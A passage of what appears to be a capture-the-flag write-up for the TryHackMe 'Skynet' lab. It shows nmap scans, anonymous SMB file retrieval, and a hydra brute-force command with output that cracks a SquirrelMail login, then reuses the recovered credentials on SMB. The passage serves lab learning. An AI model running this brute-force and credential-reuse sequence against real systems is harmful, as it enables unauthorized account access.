Scanned at 2020-08-24 20:27:47 EDT <span style="color:#66d9ef">for</span> 173s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-chrono: Request times <span style="color:#66d9ef">for</span> /; avg: 798.45ms; min: 774.45ms; max: 828.46ms
|_http-comments-displayer: Couldn<span style="color:#e6db74">&#39;t find any comments.
</span><span style="color:#e6db74">| http-csrf: 
</span><span style="color:#e6db74">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.128.90
</span><span style="color:#e6db74">|   Found the following possible CSRF vulnerabilities: 
</span><span style="color:#e6db74">|     
</span><span style="color:#e6db74">|     Path: http://10.10.128.90:80/
</span><span style="color:#e6db74">|     Form id: 
</span><span style="color:#e6db74">|_    Form action: #
</span><span style="color:#e6db74">|_http-date: Tue, 25 Aug 2020 00:28:25 GMT; +30s from local time.
</span><span style="color:#e6db74">|_http-devframework: Couldn&#39;</span>t determine the underlying framework or CMS. Try increasing <span style="color:#e6db74">&#39;httpspider.maxpagecount&#39;</span> value to spider more pages.
|_http-dombased-xss: Couldn<span style="color:#e6db74">&#39;t find any DOM based XSS.
</span><span style="color:#e6db74">|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=&lt;number|all&gt; for deeper analysis)
</span><span style="color:#e6db74">| http-enum: 
</span><span style="color:#e6db74">|   /squirrelmail/src/login.php: squirrelmail version 1.4.23 [svn]
</span><span style="color:#e6db74">|_  /squirrelmail/images/sm_logo.png: SquirrelMail
</span><span style="color:#e6db74">| http-errors: 
</span><span style="color:#e6db74">| Spidering limited to: maxpagecount=40; withinhost=10.10.128.90
</span><span style="color:#e6db74">|   Found the following error pages: 
</span><span style="color:#e6db74">|   
</span><span style="color:#e6db74">|   Error Code: 404
</span><span style="color:#e6db74">|_  	http://10.10.128.90:80/favicon.ico
</span><span style="color:#e6db74">|_http-feed: Couldn&#39;</span>t find any feeds.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-grep: 
|   <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> http://10.10.128.90:80/favicon.ico: 
|     <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> ip: 
|_      + 10.10.128.90
| http-headers: 
|   Date: Tue, <span style="color:#ae81ff">25</span> Aug <span style="color:#ae81ff">2020</span> 00:28:28 GMT
|   Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|   Last-Modified: Tue, <span style="color:#ae81ff">17</span> Sep <span style="color:#ae81ff">2019</span> 08:58:28 GMT
|   ETag: <span style="color:#e6db74">&#34;20b-592bbec81c0b6&#34;</span>
|   Accept-Ranges: bytes
|   Content-Length: <span style="color:#ae81ff">523</span>
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  <span style="color:#f92672">(</span>Request type: HEAD<span style="color:#f92672">)</span>
|_http-jsonp-detection: Couldn<span style="color:#e6db74">&#39;t find any JSONP endpoints.
</span><span style="color:#e6db74">|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
</span><span style="color:#e6db74">|_http-malware-host: Host appears to be clean
</span><span style="color:#e6db74">| http-methods: 
</span><span style="color:#e6db74">|_  Supported Methods: GET HEAD POST OPTIONS
</span><span style="color:#e6db74">|_http-mobileversion-checker: No mobile version detected.
</span><span style="color:#e6db74">| http-php-version: Logo query returned unknown hash 9d7adb7aa48bcf25afd6593b7df1aacd
</span><span style="color:#e6db74">|_Credits query returned unknown hash 9d7adb7aa48bcf25afd6593b7df1aacd
</span><span style="color:#e6db74">|_http-referer-checker: Couldn&#39;</span>t find any cross-domain scripts.
|_http-security-headers: 
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; css: 1; png: <span style="color:#ae81ff">1</span>
|   Longest directory structure:
|     Depth: <span style="color:#ae81ff">0</span>
|     Dir: /
|   Total files found <span style="color:#f92672">(</span>by extension<span style="color:#f92672">)</span>:
|_    Other: 1; css: 1; png: <span style="color:#ae81ff">1</span>
|_http-stored-xss: Couldn<span style="color:#e6db74">&#39;t find any stored XSS vulnerabilities.
</span><span style="color:#e6db74">|_http-title: Skynet
</span><span style="color:#e6db74">| http-useragent-tester: 
</span><span style="color:#e6db74">|   Status for browser useragent: 200
</span><span style="color:#e6db74">|   Allowed User Agents: 
</span><span style="color:#e6db74">|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
</span><span style="color:#e6db74">|     libwww
</span><span style="color:#e6db74">|     lwp-trivial
</span><span style="color:#e6db74">|     libcurl-agent/1.0
</span><span style="color:#e6db74">|     PHP/
</span><span style="color:#e6db74">|     Python-urllib/2.5
</span><span style="color:#e6db74">|     GT::WWW
</span><span style="color:#e6db74">|     Snoopy
</span><span style="color:#e6db74">|     MFC_Tear_Sample
</span><span style="color:#e6db74">|     HTTP::Lite
</span><span style="color:#e6db74">|     PHPCrawl
</span><span style="color:#e6db74">|     URI::Fetch
</span><span style="color:#e6db74">|     Zend_Http_Client
</span><span style="color:#e6db74">|     http client
</span><span style="color:#e6db74">|     PECL::HTTP
</span><span style="color:#e6db74">|     Wget/1.13.4 (linux-gnu)
</span><span style="color:#e6db74">|_    WWW-Mechanize/1.34
</span><span style="color:#e6db74">| http-vhosts: 
</span><span style="color:#e6db74">|_127 names had status 200
</span><span style="color:#e6db74">|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=&lt;number|all&gt; for deeper analysis)
</span><span style="color:#e6db74">|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#39;</span>t find wp-login.php

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Mon Aug 24 20:30:40 2020 -- 1 IP address (1 host up) scanned in 173.37 seconds</span>
</code></pre></div><p>And we can see some of this summarized on the quick tcp nmap scan results:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Nmap 7.80 scan initiated Mon Aug 24 20:25:19 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/results/10.10.128.90/scans/_quick_tcp_nmap.txt -oX /home/kali/results/10.10.128.90/scans/xml/_quick_tcp_nmap.xml 10.10.128.90</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.128.90
Host is up, received user-set <span style="color:#f92672">(</span>0.36s latency<span style="color:#f92672">)</span>.
Scanned at 2020-08-24 20:25:20 EDT <span style="color:#66d9ef">for</span> 146s
Not shown: <span style="color:#ae81ff">994</span> closed ports
Reason: <span style="color:#ae81ff">994</span> conn-refused
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   <span style="color:#ae81ff">256</span> 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
80/tcp  open  http        syn-ack Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Skynet
110/tcp open  pop3        syn-ack Dovecot pop3d
|_pop3-capabilities: SASL TOP CAPA RESP-CODES PIPELINING UIDL AUTH-RESP-CODE
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
143/tcp open  imap        syn-ack Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS ENABLE Pre-login SASL-IR have IDLE post-login listed OK capabilities LITERAL+ more LOGINDISABLEDA0001 ID IMAP4rev1
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m30s, deviation: 2h53m12s, median: 29s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
| Names:
|   SKYNET&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   SKYNET&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   SKYNET&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
|   <span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02__MSBROWSE__<span style="color:#ae81ff">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| Statistics:
|   <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
|   <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
|_  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
| p2p-conficker: 
|   Checking <span style="color:#66d9ef">for</span> Conficker.C or higher...
|   Check <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>port 5983/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Couldn<span style="color:#e6db74">&#39;t connect)
</span><span style="color:#e6db74">|   Check 2 (port 42355/tcp): CLEAN (Couldn&#39;</span>t connect<span style="color:#f92672">)</span>
|   Check <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>port 54521/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Failed to receive data<span style="color:#f92672">)</span>
|   Check <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>port 45683/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Failed to receive data<span style="color:#f92672">)</span>
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 <span style="color:#f92672">(</span>Samba 4.3.11-Ubuntu<span style="color:#f92672">)</span>
|   Computer name: skynet
|   NetBIOS computer name: SKYNET<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   FQDN: skynet
|_  System time: 2020-08-24T19:28:04-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-25T00:28:04
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Mon Aug 24 20:27:46 2020 -- 1 IP address (1 host up) scanned in 147.37 seconds</span>

</code></pre></div><p>We download some files using an anonymous SMB connection:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
kali@kali:~/Documents/THM/skynet$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
kali@kali:~/Documents/THM/skynet$ smbclient //10.10.128.90/anonymous/
Enter WORKGROUP<span style="color:#ae81ff">\k</span>ali<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls -al
NT_STATUS_NO_SUCH_FILE listing <span style="color:#ae81ff">\-</span>al
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 03:20:17 <span style="color:#ae81ff">2019</span>
  attention.txt                       N      <span style="color:#ae81ff">163</span>  Tue Sep <span style="color:#ae81ff">17</span> 23:04:59 <span style="color:#ae81ff">2019</span>
  logs                                D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 <span style="color:#ae81ff">2019</span>
  books                               D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 <span style="color:#ae81ff">2019</span>

                <span style="color:#ae81ff">9204224</span> blocks of size 1024. <span style="color:#ae81ff">5370592</span> blocks available
smb: <span style="color:#ae81ff">\&gt;</span> get logs
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file <span style="color:#ae81ff">\l</span>ogs
smb: <span style="color:#ae81ff">\&gt;</span> cd logs
smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 <span style="color:#ae81ff">2019</span>
  log2.txt                            N        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:42:13 <span style="color:#ae81ff">2019</span>
  log1.txt                            N      <span style="color:#ae81ff">471</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:41:59 <span style="color:#ae81ff">2019</span>
  log3.txt                            N        <span style="color:#ae81ff">0</span>  Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 <span style="color:#ae81ff">2019</span>

                <span style="color:#ae81ff">9204224</span> blocks of size 1024. <span style="color:#ae81ff">5370592</span> blocks available
smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> get log1.txt
getting file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\l</span>og1.txt of size <span style="color:#ae81ff">471</span> as log1.txt <span style="color:#f92672">(</span>0.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.3 KiloBytes/sec<span style="color:#f92672">)</span>
smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> get log2.txt
getting file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\l</span>og2.txt of size <span style="color:#ae81ff">0</span> as log2.txt <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.2 KiloBytes/sec<span style="color:#f92672">)</span>
smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> get log3.txt
getting file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\l</span>og3.txt of size <span style="color:#ae81ff">0</span> as log3.txt <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> exit
kali@kali:~/Documents/THM/skynet$ cat log1.txt 
<span style="color:#f92672">{</span>list_of_possible_passwords_REDACTED<span style="color:#f92672">}</span>
kali@kali:~/Documents/THM/skynet$ cat log2.txt
kali@kali:~/Documents/THM/skynet$ cat log3.txt
kali@kali:~/Documents/THM/skynet$ ls
attention.txt  log1.txt  log2.txt  log3.txt  readme.md
kali@kali:~/Documents/THM/skynet$ 

</code></pre></div><p>We get a very interesting list of possible passwords? usernames? from the <strong>log1.txt</strong> file and as per the <strong>attention.txt</strong> we know the sysadmin requested all users to change passwords.</p>
<p>if we visit the <strong>/squirrelmail</strong> URL we get a webmail login form, let&rsquo;s try our luck with hydra:</p>
<p>We need to capture a login request, I used Burp but you can even when this directly from the Browser. The request gives us all we need to attempt to brute force our way into <strong>Squirrelmail</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">POST /squirrelmail/src/redirect.php HTTP/1.1
Host: 10.10.180.3
Content-Length: <span style="color:#ae81ff">75</span>
Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
Origin: http://10.10.180.3
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.9
Referer: http://10.10.180.3/squirrelmail/src/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
Cookie: SQMSESSID<span style="color:#f92672">=</span>s9tj14ejoj4qcukfjbltigs9c4
Connection: close

login_username<span style="color:#f92672">=</span>test&amp;secretkey<span style="color:#f92672">=</span>test&amp;js_autodetect_results<span style="color:#f92672">=</span>1&amp;just_logged_in<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</code></pre></div><p>Using the information from the request we form our command for <strong>hydra</strong>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">hydra -l milesdyson -P log1.txt 10.10.136.30 http-post-form <span style="color:#e6db74">&#39;/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:F=Unknown user or password incorrect&#39;</span>
</code></pre></div><p>The attack result is the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/skynet<span style="color:#f92672">]</span>
└─$ hydra -l milesdyson -P log1.txt 10.10.136.30 http-post-form <span style="color:#e6db74">&#39;/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:F=Unknown user or password incorrect&#39;</span>
Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-25 18:06:16
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">31</span> login tries <span style="color:#f92672">(</span>l:1/p:31<span style="color:#f92672">)</span>, ~2 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.136.30:80/squirrelmail/src/redirect.php:login_username<span style="color:#f92672">=</span>^USER^&amp;secretkey<span style="color:#f92672">=</span>^PASS^&amp;js_autodetect_results<span style="color:#f92672">=</span>1&amp;just_logged_in<span style="color:#f92672">=</span>1:F<span style="color:#f92672">=</span>Unknown user or password incorrect
<span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.136.30   login: milesdyson   password: <span style="color:#f92672">{</span>PASSWORD_REDACTED<span style="color:#f92672">}</span>
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2020-08-25 18:06:38

</code></pre></div><p>With this result we can answer the first question of the room. <strong>(milesdyson:{PASSWORD_REDACTED})</strong></p>
<p>If we log into the email with Miles&rsquo; credentials, we see some emails:</p>
<p><img src="https://i.imgur.com/ZCY4EJy.png" alt="Miles emails"></p>
<p>It seems Miles&rsquo; password has been reset due to a system malfunction:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">We have changed your smb password after system malfunction.
Password: <span style="color:#f92672">{</span>PASSWORD_REDACTED<span style="color:#f92672">}</span>
</code></pre></div><p>We also see some other emails with binary information:</p>
<p><img src="https://i.imgur.com/Ew19QQx.png" alt="Miles emails binary"></p>
<p>We&rsquo;ll download a copy of this in case it comes in handy later on, the third and last email is also quite odd:</p>
<p><img src="https://i.imgur.com/C0Va2rs.png" alt="Miles third email"></p>
<p>I&rsquo;ve looked into that binary email and translates to some nonsense for now. Let&rsquo;s try to connect to that SMB as Miles, shall we?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/skynet<span style="color:#f92672">]</span>
└─$ smbclient //10.10.136.30/milesdyson/ -U milesdyson                                                                                                                                                                      
Enter WORKGROUP<span style="color:#ae81ff">\m</span>ilesdyson<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> dir
  .                                   D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:47 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 23:51:03 <span style="color:#ae81ff">2019</span>
  Improving Deep Neural Networks.pdf      N  <span style="color:#ae81ff">5743095</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>
  Natural Language Processing-Building Sequence Models.pdf      N <span style="color:#ae81ff">12927230</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>
  Convolutional Neural Networks-CNN.pdf      N <span style="color:#ae81ff">19655446</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>
  notes                               D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:18:40 <span style="color:#ae81ff">2019</span>
  Neural Networks and Deep Learning.pdf      N  <span style="color:#ae81ff">4304586</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>
  Structuring your Machine Learning Project.pdf      N  <span style="color:#ae81ff">3531427</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>

                <span style="color:#ae81ff">9204224</span> blocks of size 1024. <span style="color:#ae81ff">5369016</span> blocks available
smb: <span style="color:#ae81ff">\&gt;</span> cd notes
smb: <span style="color:#ae81ff">\n</span>otes<span style="color:#ae81ff">\&gt;</span> dir
  .                                   D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:18:40 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:47 <span style="color:#ae81ff">2019</span>
  3.01 Search.md                      N    <span style="color:#ae81ff">65601</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  4.01 Agent-Based Models.md          N     <span style="color:#ae81ff">5683</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  2.08 In Practice.md                 N     <span style="color:#ae81ff">7949</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  0.00 Cover.md                       N     <span style="color:#ae81ff">3114</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.02 Linear Algebra.md              N    <span style="color:#ae81ff">70314</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  important.txt                       N      <span style="color:#ae81ff">117</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:18:39 <span style="color:#ae81ff">2019</span>
  6.01 pandas.md                      N     <span style="color:#ae81ff">9221</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  3.00 Artificial Intelligence.md      N       <span style="color:#ae81ff">33</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  2.01 Overview.md                    N     <span style="color:#ae81ff">1165</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  3.02 Planning.md                    N    <span style="color:#ae81ff">71657</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  1.04 Probability.md                 N    <span style="color:#ae81ff">62712</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
  2.06 Natural Language Processing.md      N    <span style="color:#ae81ff">82633</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
